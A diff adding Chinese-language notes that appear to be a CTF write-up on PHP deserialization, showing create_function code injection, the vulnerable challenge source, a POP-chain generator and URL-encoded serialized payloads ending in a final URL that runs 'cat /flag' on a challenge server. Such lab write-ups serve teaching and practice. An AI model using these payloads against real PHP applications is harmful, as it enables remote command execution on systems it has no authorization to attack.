@@ -94,3 +94,89 @@ def run(source_text):
     return result
 ```
 
+
+
+php的神奇函数
+create_function；如下代码就能调用系统命令ls /
+
+<?php
+echo 'Hello World!';
+create_function('',";}system('ls /');//")
+?>
+
+
+
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+class func
+{
+        public $mod1="1";
+        public $mod2="2";
+         public $key="3";
+        public function __destruct()
+        {        
+                unserialize($this->key)();
+                $this->mod2 = "welcome ".$this->mod1;
+                  
+        } 
+}
+
+class GetFlag
+{        public $code;
+         public $action;
+        public function get_flag(){
+            $a=$this->action;
+            $a('', $this->code);
+        }
+}
+
+
+$str = 'O%3A4%3A%22func%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A121%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A19%3A%22%3B%7Dsystem%28%27ls+%2F%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D';
+echo urldecode($str);
+unserialize(urldecode($str));
+
+?> 
+
+
+
+
+
+
+
+首先利用一个creat_function()函数去做这里，`$a('', $this->code);`
+
+要执行到getflag的get_flag方法，就可以这样打pop链：
+
+php
+<?php
+class func
+{
+    public $key;
+    public function __construct()
+{
+        $this->key = serialize([new GetFlag(), "get_flag"]);
+    }
+}
+
+
+class GetFlag
+{
+    public $code;
+    public $action;
+    public function __construct()
+{
+        $this->code = ";}system('ls /');//";
+        $this->action = "create_function";
+    }
+}
+echo urlencode(serialize(new func()));  
+O%3A4%3A%22func%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A121%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A19%3A%22%3B%7Dsystem%28%27ls+%2F%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D
+成功执行了命令，flag在根目录，cat /flag 就OK了：
+
+最终payload：
+
+http://111.74.9.109:10069/?0=O%3A4%3A%22func%22%3A3%3A%7Bs%3A4%3A%22mod1%22%3BN%3Bs%3A4%3A%22mod2%22%3BN%3Bs%3A3%3A%22key%22%3Bs%3A126%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A24%3A%22%3B%7Dsystem%28%27cat+%2Fflag%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D
+
+图片
